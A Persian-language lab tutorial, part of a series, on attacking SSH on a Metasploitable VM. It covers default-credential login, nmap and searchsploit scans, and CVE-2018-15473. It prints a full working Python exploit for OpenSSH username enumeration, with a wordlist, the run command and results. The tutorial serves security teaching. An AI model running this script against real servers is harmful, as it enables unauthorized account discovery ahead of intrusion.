# آنچه گذشت
در قسمت قبل، پورت ۲۱ و پروتکل ftp را باهم بررسی کردیم و انواع روش‌های تست‌نفوذ اون را دیدیم. در این بخش می‌خوایم روی پورت ۲۲ پروتکل ssh از سیستم‌عامل متاسپلویتیبل کار کنیم.

# کمی عمیق‌تر
قبل‌ازاین‌که وارد اسکن کردن بشیم و پورت ۲۱ سرور را نگاه کنیم تا ببینیم چه سرویسی مسئول اجرای ssh است، بیاین کمی درباره پروتکل ftp و ssh صحبت کنیم. در بخش قبلی، ما مثال‌های مختلفی را از پروتکل ftp دیدیم. که باعث میشد دوتا کامپیوتر در شبکه بتونند فایل‌هاشون را به‌همدیگه انتقال بدند. این تمام قابلیت ftp بود که می‌تونه به عنوان یک سرور فعال بشه و کاربران بهش وصل بشن و فایل‌هایی را اونجا ببینند یا به‌اشتراک بزارند. اما ssh مخفف secute shell علاوه‌بر انتقال فایل، قابلیت‌های دیگه‌ای هم مثل دستورات shell/ اجرای دستورات ویندوزی، تونلینگ، پورت‌فورواردینگ و غیره را فراهم می‌کنه. درواقع شما با استفاده ازاین پروتکل، می‌تونید از راه دور به یک سیستم‌عامل متصل بشید و از سرویس‌ها، و قابلیت‌های اون سیستم‌عامل هم استفاده کنید. همچنین تمرکز ssh بر روی رمزنگاری و ارتباطات راه‌دور به‌صورت ایمن است.
بیاین برای درک بیشتر، یک مثال از ssh را هم باهم ببینیم. من با دستور زیر به پورت ۲۲ سرور خودم متصل میشم:

`ssh -p 22 192.168.56.102`

> [!WARNING]
> سیستم‌عامل متاسپلویتیبل ۱ به دلیل قدیمی‌بودن از الگوریتم‌های قدیمی‌تری برای اتصال به SSH پشتیبانی می‌کنه که ممکنه در ابزار SSH شما پشتیبانی نشه. بنابرین اگه هنگام اتصال چنین خطایی را دریافت کردید: `Unable to negotiate with 192.168.56.102 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss` باید در فایل `~/.ssh/config` (اگه این فایل وجود نداشت، یکی بسازید) رشته عبارت
> ```
> Host 192.168.56.102
>  HostKeyAlgorithms +ssh-rsa,ssh-dss
>```
> را قرار بدید تا ابزار ssh شما از الگوریتم‌های ssh-rsa و ssh-dss پشتیبانی کنه. سپس ازشما تاییدیه‌ای میخواد مبنی‌بر اضافه‌کردن کلیدعمومی سرور؛ و بعداز اون مجددا از شما نام‌کاربری و رمزعبور معتبر هم می‌خواد. دراینجا یوزرنیم پسوردهای پیشفرض برای متاسپلویتیبل ۱ همیشه msfadmin:msfadmin است. بنابرین ما باردیگه با نام‌کاربری msfadmin به سرور متصل میشیم:

`ssh -p 22 msfadmin@192.168.56.102`

سپس از ما رمزعبور می‌خواد، که اون را هم msfadmin وارد می‌کنیم. و این خروجی ما:

```
➜  ~ ssh -p 22 msfadmin@192.168.56.102
msfadmin@192.168.56.102's password: 
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
No mail.
Last login: Thu Jul  4 00:07:43 2024 from 192.168.56.1
msfadmin@metasploitable:~$ 

```

همانطور که می‌بینید، درحال حاضر ما با موفقیت به سرور ssh خودمون وصل شدیم. اما دراینجا چه دستوراتی را می‌تونیم اجرا کنیم؟ در بخش قبلی که به سرور ftp وصل شدیم، تنها مجاز بودیم تا دستورات زیر را اجرا کنیم:
```
ftp> ?
Commands may be abbreviated.  Commands are:

!               edit            lpage           nlist           rcvbuf          struct
$               epsv            lpwd            nmap            recv            sunique
account         epsv4           ls              ntrans          reget           system
append          epsv6           macdef          open            remopts         tenex
ascii           exit            mdelete         page            rename          throttle
bell            features        mdir            passive         reset           trace
binary          fget            mget            pdir            restart         type
bye             form            mkdir           pls             rhelp           umask
case            ftp             mls             pmlsd           rmdir           unset
cd              gate            mlsd            preserve        rstatus         usage
cdup            get             mlst            progress        runique         user
chmod           glob            mode            prompt          send            verbose
close           hash            modtime         proxy           sendport        xferbuf
cr              help            more            put             set             ?
debug           idle            mput            pwd             site
delete          image           mreget          quit            size
dir             lcd             msend           quote           sndbuf
disconnect      less            newer           rate            status
```

که شامل دستوراتی محدود و صرفا برای انتقال فایل‌ها مناسب بود ( مثل تغییر دایرکتویر، خوندن فایل‌ها، دانلود/آپلود ). اما زمانی که با پروتکل ssh وصل شدیم، تمام دستوراتی که در سرور وجود داره، و تمام ابزارهایی که اونجا هست را می‌تونیم استفاده کنیم. مثلا می‌تونیم نرم‌افزار پایتون را در سرور اجرا و استفاده کنیم: یک آدرس را پینگ بگیریم: یک فایل را آپلود و دانلود کنیم:

```
# اجرا کردن ابزار پایتون در سرور
msfadmin@metasploitable:~$ python
Python 2.5.2 (r252:60911, Jan 20 2010, 21:48:48) 
[GCC 4.2.4 (Ubuntu 4.2.4-1ubuntu3)] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> 

# پینگ کردن کالی‌لینوکس خودمون از سرور
msfadmin@metasploitable:~$ ping 192.168.56.1 -c 3
PING 192.168.56.1 (192.168.56.1) 56(84) bytes of data.
64 bytes from 192.168.56.1: icmp_seq=1 ttl=64 time=0.611 ms
64 bytes from 192.168.56.1: icmp_seq=2 ttl=64 time=0.614 ms
64 bytes from 192.168.56.1: icmp_seq=3 ttl=64 time=0.745 ms

--- 192.168.56.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1998ms
rtt min/avg/max/mdev = 0.611/0.656/0.745/0.069 ms

# آپلود کردن یک فایل از سیستم‌عامل خودمون به سرور
scp /home/mahyar/test.txt msfadmin@192.168.56.102:/home/msfadmin
msfadmin@192.168.56.102's password: 
test.txt           100%    6     8.2KB/s   00:00  

# دانلود کردن یک فایل از سرور به سیستم‌عامل خودمون
scp msfadmin@192.168.56.102:/home/msfadmin/test.txt /home/mahyar/
msfadmin@192.168.56.102's password: 
test.txt           100%    6     8.2KB/s   00:00 

## برای آپلود و دانلود کردن فایل‌ها، می‌تونید از ابزار scp در لینوکس خودتون استفاده کنید. دقت کنید که این ابزار باید روی سیستم‌عامل خودتون اجرا بشه تا بتونید آپلود/دانلود را از سرور انجام بدید.
```

درمثال بالا دیدیم که می‌تونیم دستورات شل را هم در سرور با استفاده از ssh اجرا کنیم، که میشه نتیجه گرفت با استفاده از این پروتکل، می‌تونیم کل سیستم‌عامل را هم کنترل کنیم ( برخلاف ftp که تنها برای انتقال فایل‌ها با دستورات محدود عمل می‌کرد ).


# اسکن پورت ۲۲
حالا که درک خوبی پیدا کردیم از پروتکل ssh و کاربردهای اون. ما الان روی متاسپلویتیبل یا سرور خودمون، روی پورت ۲۲، یک پروتکل ssh داشتیم و الان می‌خوایم ببینیم چه سرویسی روی پورت ۲۲ داره پروتکل ssh را اجرا می‌کنه و بررسی کنیم که آیا اون سرویس و نسخه آسیب‌پذیری شناخته‌شده‌ای داره که ما بتونیم ازش استفاده کنیم یا نه.
در قدم اول، پورت ۲۲ سرور را برای دیدن سرویس و نسخه اون اسکن می‌کنیم:

`sudo nmap -p 22 -sV 192.168.56.102`

و این خروجی دستور بالا:

```
➜  ~ sudo nmap -p 22 -sV 192.168.56.102
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-04 08:09 +0330
Nmap scan report for 192.168.56.102
Host is up (0.00080s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
MAC Address: 08:00:27:B8:DA:1E (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.22 seconds

```

بنابرین روی پورت ۲۲ سرویس OpenSSH با نسخه 4.7p1 اجرا میشه. بیاین یک کوچولو درباره این سرویس هم بدونیم. openssh یا open secure shell یک ابزار متن‌باز است که امکان استفاده از پروتکل ssh را به صورت رمزنگاری‌شده و ایمن به‌ما میده و طیف دستورات زیادی را برامون فراهم کرده تا بتونیم با استفاده از اون‌ها، با سرور تعامل داشته باشیم. درمثالی که قبل‌تر باهم دیدیم، این اتصالی که به سرور ssh خودمون داشتیم و ابزارهایی که از راه‌دور ( از روی سیستم‌عامل خودمون ) در سرور اجرا کردیم، همش کار openssh بود که این رابط کاربری را برامون فراهم کرده.
حالا بیاین این نسخه از سرویس را از نظر آسیب‌پذیری‌های موجود هم بررسی کنیم. می‌تونیم درقدم اول از searchsploit استفاده کنیم تا ببینیم آسیب‌پذیری شناخته‌شده‌ای برای این نسخه در دیتابیس exploitdb وجود داره یا نه!

`searchsploit OpenSSH 4.7p1`

> [!NOTE]
> یک چیزی که خوبه همیشه قبل از پیداکردن آسیب‌پذیری‌ها روی یک نسخه از سرویس بدونیم، اینه که آخرین نسخه از اون سرویس چنده؟ به عنوان مثال اگه من الان به نسخه 4.7 از سرویس openssh برخورد کردم و جدیدترین نسخه اون ۵ است، ممکنه آسیب‌پذیری‌های خیلی حادی وجود نداشته باشه که ما بتونیم ازش استفاده کنم. همینطور در بخش قبلی که سرویس proFTPD را با نسخه ۱.۳.۱ بررسی کردیم، نتونستیم آسیب‌پذیری حاد و بزرگی روی اون پیدا و ازش استفاده کنیم، چون جدیدترین نسخه اون ۱.۳.۸ است و ۱.۳.۱ نسخه خیلی قدیمی اون نبود.
> توی این موردهم، نسخه openssh ما ۴.۷ است و درحال حاضر و در زمان نوشتن این مقاله (۲۰۲۴) جدیدترین نسخه این سرویس، ۹.۸ است که نسخه ۴.۷ نسبت به اون قدیمی‌تر حساب میشه. اما بیاین بریم جلوتر و ببینیم برای این نسخه چه آسیب‌پذیری‌هایی وجود داره.

خروجی دستور searchsploit برای جستجوی آسیب‌پذیری‌ها روی یک سرویس و نسخه اون:
```
----------------------------------------------------- ---------------------------------
 Exploit Title                                       |  Path
----------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration             | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)       | linux/remote/45210.py
OpenSSH < 6.6 SFTP (x64) - Command Execution         | linux_x86-64/remote/45000.c
OpenSSH < 6.6 SFTP - Command Execution               | linux/remote/45001.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Fo | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loa | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                 | linux/remote/45939.py
----------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

باکمی جستجو در اینترنت درباره ۲ تا آسیب‌پذیری اول، به cve-2018-15473 میرسیم که یک آسیب‌پذیری روی سرویس openssh از نسخه ۲.۳ تا ۷.۷ است و به این صورت کار می‌کنه: شما برای اتصال به سرویس openssh نیاز به وارد کردن نام‌کاربری و رمزعبور دارید. کاری که ما انتظار داریم این سرویس انجام بده اینه که نام‌کاربری و رمزعبور را از ما بپرسه و اون را در سمت سرور بررسی کنه. اگه معتبر بود، بهمون اجازه بده به سرور متصل بشیم و اگه نامعتبربود، بهمون بگه که یوزرنیم پسورد شما اشتباهه. اما وقتی پکت‌هایی که به سرور میره و میاد، و ریسپانس‌هایی که سرور بهمون میده را بررسی کنیم متوجه میشیم زمانی که نام‌کاربری را وارد می‌کنیم، اگه اون نام‌کاربری در سمت سرور وجود داشته باشه، از ما انتظار تکمیل فرایند احرازهویت و رمزعبور را داره اما اگه اون نام‌کاربری نامعتبر باشه، خروجی متفاوتی در ریسپانس‌ها داریم و خطاهایی مثل InvalidUsername داریم.
من به دنبال نحوه استفاده از این آسیب‌پذیری بودم و کدهای exploitdb را هم بررسی کردم اما ناقص بودند. درنهایت به یک سورس کد از گیت‌هاب رسیدم:
<details>
<summary>https://github.com/epi052/cve-2018-15473</summary>
</br>

  ```
#!/usr/bin/env python3
"""
derived from work done by Matthew Daley
https://bugfuzz.com/stuff/ssh-check-username.py

props to Justin Gardner for the add_boolean workaround

CVE-2018-15473
--------------
OpenSSH through 7.7 is prone to a user enumeration vulnerability due to not delaying bailout for an
invalid authenticating user until after the packet containing the request has been fully parsed, related to
auth2-gss.c, auth2-hostbased.c, and auth2-pubkey.c.

Author: epi
    https://epi052.gitlab.io/notes-to-self/
    https://gitlab.com/epi052/cve-2018-15473
"""
import sys
import re
import socket
import logging
import argparse
import multiprocessing
from typing import Union
from pathlib import Path

import paramiko

assert sys.version_info >= (3, 6), "This program requires python3.6 or higher"


class Color:
    """ Class for coloring print statements.  Nothing to see here, move along. """
    BOLD = '\033[1m'
    ENDC = '\033[0m'
    RED = '\033[38;5;196m'
    BLUE = '\033[38;5;75m'
    GREEN = '\033[38;5;149m'
    YELLOW = '\033[38;5;190m'

    @staticmethod
    def string(string: str, color: str, bold: bool = False) -> str:
        """ Prints the given string in a few different colors.

        Args:
            string: string to be printed
            color:  valid colors "red", "blue", "green", "yellow"
            bold:   T/F to add ANSI bold code

        Returns:
            ANSI color-coded string (str)
        """
        boldstr = Color.BOLD if bold else ""
        colorstr = getattr(Color, color.upper())
        return f'{boldstr}{colorstr}{string}{Color.ENDC}'


class InvalidUsername(Exception):
    """ Raise when username not found via CVE-2018-15473. """


def apply_monkey_patch() -> None:
    """ Monkey patch paramiko to send invalid SSH2_MSG_USERAUTH_REQUEST.

        patches the following internal `AuthHandler` functions by updating the internal `_handler_table` dict
            _parse_service_accept
            _parse_userauth_failure

        _handler_table = {
            MSG_SERVICE_REQUEST: _parse_service_request,
            MSG_SERVICE_ACCEPT: _parse_service_accept,
            MSG_USERAUTH_REQUEST: _parse_userauth_request,
            MSG_USERAUTH_SUCCESS: _parse_userauth_success,
            MSG_USERAUTH_FAILURE: _parse_userauth_failure,
            MSG_USERAUTH_BANNER: _parse_userauth_banner,
            MSG_USERAUTH_INFO_REQUEST: _parse_userauth_info_request,
            MSG_USERAUTH_INFO_RESPONSE: _parse_userauth_info_response,
        }
    """

    def patched_add_boolean(*args, **kwargs):
        """ Override correct behavior of paramiko.message.Message.add_boolean, used to produce malformed packets. """

    auth_handler = paramiko.auth_handler.AuthHandler
    old_msg_service_accept = auth_handler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT]

    def patched_msg_service_accept(*args, **kwargs):
        """ Patches paramiko.message.Message.add_boolean to produce a malformed packet. """
        old_add_boolean, paramiko.message.Message.add_boolean = paramiko.message.Message.add_boolean, patched_add_boolean
        retval = old_msg_service_accept(*args, **kwargs)
        paramiko.message.Message.add_boolean = old_add_boolean
        return retval

    def patched_userauth_failure(*args, **kwargs):
        """ Called during authentication when a username is not found. """
        raise InvalidUsername(*args, **kwargs)

    auth_handler._client_handler_table.update({
        paramiko.common.MSG_SERVICE_ACCEPT: patched_msg_service_accept,
        paramiko.common.MSG_USERAUTH_FAILURE: patched_userauth_failure
    })


def create_socket(hostname: str, port: int) -> Union[socket.socket, None]:
    """ Small helper to stay DRY.

    Returns:
        socket.socket or None
    """
    # spoiler alert, I don't care about the -6 flag, it's really
    # just to advertise in the help that the program can handle ipv6
    try:
        return socket.create_connection((hostname, port))
    except socket.error as e:
        print(f'socket error: {e}', file=sys.stdout)


def connect(username: str, hostname: str, port: int, verbose: bool = False, **kwargs) -> None:
    """ Connect and attempt keybased auth, result interpreted to determine valid username.

    Args:
        username:   username to check against the ssh service
        hostname:   hostname/IP of target
        port:       port where ssh is listening
        key:        key used for auth
        verbose:    bool value; determines whether to print 'not found' lines or not

    Returns:
        None
    """
    sock = create_socket(hostname, port)
    if not sock:
        return

    transport = paramiko.transport.Transport(sock)

    try:
        transport.start_client()
    except paramiko.ssh_exception.SSHException:
        return print(Color.string(f'[!] SSH negotiation failed for user {username}.', color='red'))

    try:
        transport.auth_publickey(username, paramiko.RSAKey.generate(1024))
    except paramiko.ssh_exception.AuthenticationException:
        print(f"[+] {Color.string(username, color='yellow')} found!")
    except InvalidUsername:
        if not verbose:
            return
        print(f'[-] {Color.string(username, color="red")} not found')


def main(**kwargs):
    """ main entry point for the program """
    sock = create_socket(kwargs.get('hostname'), kwargs.get('port'))
    if not sock:
        return

    banner = sock.recv(1024).decode()

    regex = re.search(r'-OpenSSH_(?P<version>\d\.\d)', banner)
    if regex:
        try:
            version = float(regex.group('version'))
        except ValueError:
            print(f'[!] Attempted OpenSSH version detection; version not recognized.\n[!] Found: {regex.group("version")}')
        else:
            ver_clr = 'green' if version <= 7.7 else 'red'
            print(f"[+] {Color.string('OpenSSH', color=ver_clr)} version {Color.string(version, color=ver_clr)} found")
    else:
        print(f'[!] Attempted OpenSSH version detection; version not recognized.\n[!] Found: {Color.string(banner, color="yellow")}')    

    apply_monkey_patch()

    if kwargs.get('username'):
        kwargs['username'] = kwargs.get('username').strip()
        return connect(**kwargs)

    with multiprocessing.Pool(kwargs.get('threads')) as pool, Path(kwargs.get('wordlist')).open() as usernames:
        host = kwargs.get('hostname')
        port = kwargs.get('port')
        verbose = kwargs.get('verbose')
        pool.starmap(connect, [(user.strip(), host, port, verbose) for user in usernames])


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="OpenSSH Username Enumeration (CVE-2018-15473)")

    parser.add_argument('hostname', help='target to enumerate', type=str)
    parser.add_argument('-p', '--port', help='ssh port (default: 22)', default=22, type=int)
    parser.add_argument('-t', '--threads', help="number of threads (default: 4)", default=4, type=int)
    parser.add_argument('-v', '--verbose', action='store_true', default=False,
                        help="print both valid and invalid usernames (default: False)")
    parser.add_argument('-6', '--ipv6', action='store_true', help="Specify use of an ipv6 address (default: ipv4)")

    multi_or_single_group = parser.add_mutually_exclusive_group(required=True)
    multi_or_single_group.add_argument('-w', '--wordlist', type=str, help="path to wordlist")
    multi_or_single_group.add_argument('-u', '--username', help='a single username to test', type=str)

    args = parser.parse_args()

    logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())

    main(**vars(args))

```

</details>

> [!IMPORTANT]
> سورس‌کد این آسیب‌پذیری به زبان پایتون است و نکته‌ای که وجود داره اینه که شما باید این کد را با پایتون ۳ اجرا کنید و ماژول paramiko نسخه ۲.۱۲.۰ را با pip نصب کنید: `pip install paramiko==2.12.0`

کاری که این آسیب پذیری انجام میده اینه که میاد و لیستی از یوزرنیم‌ها را روی سرور تست می‌کنه و درنهایت یوزرنیم‌های معتبر در سمت سرور را پیدا می‌کنه. این یک نمونه از پسوردلیستی هست که من ساختم:

<details>
<summary>pass.txt</summary>
</br>

  ```
mahyar
alireza
ahmadi
hassan
root
abasi
gholamreza
msfadmin

```

</details>

سپس می‌تونیم اکسپلویت خودمون را با دستور زیر اجرا کنیم:

`python ssh-username-enum.py 192.168.56.102 -w pass -v`

> آیپی سروری که سرویس openssh ما را اجرا می‌کنه: 192.168.56.102

> -w pass: آدرس پسوردلیست

> -v: نام‌های‌کاربری پیدانشده را هم نشون میده

و خروجی این دستور برای من:

```
[+] OpenSSH version 4.7 found
[-] alireza not found
[-] mahyar not found
[-] ahmadi not found
[-] hassan not found
[-] gholamreza not found
[+] root found!
[-] abasi not found
[+] msfadmin found!
```

> [!WARNING]
> ترجیحا هنگام استفاده از این آسیب‌پذیری، از thread ها و ارسال تعداد زیادی از درخواست‌ها به صورت همزمان به سمت سرور استفاده نکنید، چراکه دردنیای واقعی‌تر، سرعت جواب‌دادن سرورها می‌تونه کندتر باشه، محدودیت و فایروال‌ها وجود داشته باشند یا خود سرور هم محدودیت پردازش همزمان داشته باشه و باعث میشه پسوردهاتون نتیجه عکس بگیره.

> [!NOTE]
> ادامه دارد . . .
